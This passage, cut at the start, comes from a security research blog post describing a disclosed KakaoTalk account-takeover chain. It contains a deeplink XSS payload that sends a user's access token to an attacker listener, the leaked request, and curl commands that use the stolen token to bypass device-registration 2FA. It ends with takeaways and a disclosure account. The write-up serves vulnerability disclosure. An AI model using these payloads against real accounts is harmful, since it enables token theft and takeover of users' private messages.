</span></code></pre></td><td><pre tabindex="0"><code data-lang="javascript"><span><span><span>&lt;</span><span>script</span><span>&gt;</span>
</span></span><span><span><span>location</span><span>.</span><span>href</span> <span>=</span> <span>decodeURIComponent</span><span>(</span><span>&#34;kakaotalk%3A%2F%2Fbuy%2Fauth%2F0%2FcleanFrontRedirect%3FreturnUrl%3Dhttps%3A%2F%2Fm.shoppinghow.kakao.com%2Fm%2Fproduct%2FQ24620753380%2Fq%3A%22%3E%3Cimg%20src%3Dx%20onerror%3D%22document.location%3Datob%28%27aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv%27%29%3B%22%3E&#34;</span><span>);</span>
</span></span><span><span><span>&lt;</span><span>/script&gt;</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>… starts the HTTP server and …</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span></code></pre></td><td><pre tabindex="0"><code data-lang="bash"><span><span>$ python3 -m http.server <span>8888</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>… opens a Netcat listener in another terminal window: <code>$ nc -l 5555</code>. Easy ;-)</p><h3 id="victim-clicks-the-link-and-leaks-an-access-token-to-the-attacker">Victim clicks the link and leaks an access token to the attacker</h3><p>Next, the attacker sends a URL (e.g., <code>http://192.168.178.20:8888/foo.html</code>) and waits until the victim clicks it. The access token should be then leaked in the Netcat listener:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span></code></pre></td><td><pre tabindex="0"><code data-lang="bash"><span><span>GET /foo.html HTTP/1.1
</span></span><span><span>Host: 192.168.178.20:5555
</span></span><span><span>Connection: keep-alive
</span></span><span><span>Upgrade-Insecure-Requests: <span>1</span>
</span></span><span><span>User-Agent: Mozilla/5.0 <span>(</span>Linux<span>;</span> Android 10<span>;</span> M2004J19C Build/QP1A.190711.020<span>;</span> wv<span>)</span> AppleWebKit/537.36 <span>(</span>KHTML, like Gecko<span>)</span> Version/4.0 Chrome/119.0.6045.66 Mobile Safari/537.36<span>;</span>KAKAOTALK 2610420<span>;</span>KAKAOTALK 10.4.2
</span></span><span><span>Accept: text/html,application/xhtml+xml,application/xml<span>;</span><span>q</span><span>=</span>0.9,image/avif,image/webp,image/apng,*/*<span>;</span><span>q</span><span>=</span>0.8,application/signed-exchange<span>;</span><span>v</span><span>=</span>b3<span>;</span><span>q</span><span>=</span>0.7
</span></span><span><span>authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e
</span></span><span><span>os_name: Android
</span></span><span><span>kakao-buy-version: 1.0
</span></span><span><span>os_version: 10.4.2
</span></span><span><span>X-Requested-With: com.kakao.talk
</span></span><span><span>Accept-Encoding: gzip, deflate
</span></span><span><span>Accept-Language: en-US,en<span>;</span><span>q</span><span>=</span>0.9
</span></span></code></pre></td></tr></tbody></table></div></div><h3 id="attacker-uses-the-access-token-to-reset-the-victims-password">Attacker uses the access token to reset the victim’s password</h3><p>Next, the attacker can now reset her/his KakaoTalk password (see instructions <a href="#kakaotalk-password-reset-with-burp">above</a>).</p><h3 id="attacker-registers-herhis-device-the-victims-kakaotalk-account">Attacker registers her/his device the victim’s KakaoTalk account</h3><p>When logging into KakaoTalk for Windows/MacOS or KiwiTalk with the victim’s credentials a second authentication factor is required. It’s a simple 4-digit pin which is either displayed in the PC version and needs to be entered in the KakaoTalk mobile app or the other way around (i.e., pin is sent to mobile app and needs to be entered in PC app).</p><p>Unfortunately, the pin can’t be brute-forced as there’s some rate limiting going on at the endpoints <code>https://talk-pilsner.kakao.com/talk-public/account/passcodeLogin/authorize</code> and <code>https://katalk.kakao.com/win32/account/register_device.json</code> (blocked after 5 attempts).</p><p>Luckily, we can still use the gathered access token to post/get the pin number to/from the KakaoTalk backend:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span></code></pre></td><td><pre tabindex="0"><code data-lang="bash"><span><span>curl -i -s -k -X <span>$&#39;POST&#39;</span> <span>\
</span></span></span><span><span><span></span>    -H <span>$&#39;Host: talk-pilsner.kakao.com&#39;</span> -H <span>$&#39;Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&#39;</span> -H <span>$&#39;Talk-Agent: android/10.4.3&#39;</span> -H <span>$&#39;Talk-Language: en&#39;</span> -H <span>$&#39;Content-Type: application/json; charset=UTF-8&#39;</span> -H <span>$&#39;Content-Length: 19&#39;</span> -H <span>$&#39;Accept-Encoding: gzip, deflate, br&#39;</span> -H <span>$&#39;User-Agent: okhttp/4.10.0&#39;</span> <span>\
</span></span></span><span><span><span></span>    --data-binary <span>$&#39;{\&#34;passcode\&#34;:\&#34;8825\&#34;}&#39;</span> <span>\
</span></span></span><span><span><span></span>    <span>$&#39;https://talk-pilsner.kakao.com/talk-public/account/passcodeLogin/authorize&#39;</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>Example response:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span></code></pre></td><td><pre tabindex="0"><code data-lang="json"><span><span><span>{</span><span>&#34;device&#34;</span><span>:{</span><span>&#34;name&#34;</span><span>:</span><span>&#34;foo&#34;</span><span>},</span><span>&#34;status&#34;</span><span>:</span><span>0</span><span>}</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>In case the pin is sent to the KakaoTalk mobile app use this curl query:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre tabindex="0"><code data-lang="bash"><span><span>curl -i -s -k -X <span>$&#39;GET&#39;</span> <span>\
</span></span></span><span><span><span></span>    -H <span>$&#39;Host: katalk.kakao.com&#39;</span> -H <span>$&#39;Accept-Language: en&#39;</span> -H <span>$&#39;User-Agent: KT/10.4.3 An/11 en&#39;</span> -H <span>$&#39;Authorization: 64f03846070b4a9ea8d8798ce14220ce00000017017793161400011gzCIqV_7kN-deea3b5dc9cddb9d8345d95438207fc0981c2de80188082d9f6a8849db8ea92e&#39;</span> -H <span>$&#39;A: android/10.4.3/en&#39;</span> -H <span>$&#39;Accept-Encoding: json, deflate, br&#39;</span> -H <span>$&#39;Connection: close&#39;</span> <span>\
</span></span></span><span><span><span></span>    <span>$&#39;https://katalk.kakao.com/android/sub_device/settings/info.json&#39;</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>Example response:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span></code></pre></td><td><pre tabindex="0"><code data-lang="json"><span><span><span>{</span><span>&#34;status&#34;</span><span>:</span><span>0</span><span>,</span><span>&#34;isVerified&#34;</span><span>:</span><span>true</span><span>,</span><span>&#34;passcode&#34;</span><span>:</span><span>&#34;8825&#34;</span><span>}</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>And we’re in! Profit 🥳 🥳 🥳</p><video width="100%" controls="">
<source src="https://github.com/stulle123/kakaotalk_analysis/assets/14765446/7fd439c5-b96b-49d9-b8b5-cd9be2a51fe9" type="video/mp4"/></video><h2 id="takeaways">Takeaways</h2><ol><li>There are still popular chat apps that don’t require a very complex exploit chain to steal users’ messages.</li><li>If app developers make a couple of simple mistakes, Android’s strong security model and message encryption won’t help.</li><li>Asian chat apps are still underrepresented in the security research community. I hope this blog post will encourage fellow researchers to dig into those apps.</li></ol><h2 id="responsible-disclosure">Responsible Disclosure</h2><p>We reported this vulnerability in December 2023 via <a href="https://bugbounty.kakao.com/">Kakao’s Bug Bounty Program</a>. However, we didn’t receive any reward as only Koreans are eligible to receive a bounty 🤯</p><p>As an immediate fix, Kakao Corp. took down <code>https://buy.kakao.com</code> and removed the <code>/auth/0/cleanFrontRedirect?returnUrl=</code> redirect. The vulnerable <code>CommerceBuyActivity</code> was removed in later versions (see <a href="https://github.com/stulle123/kakaotalk_analysis/tree/main/report">correspondence</a>).</p></div></div>
  </body>
</html>
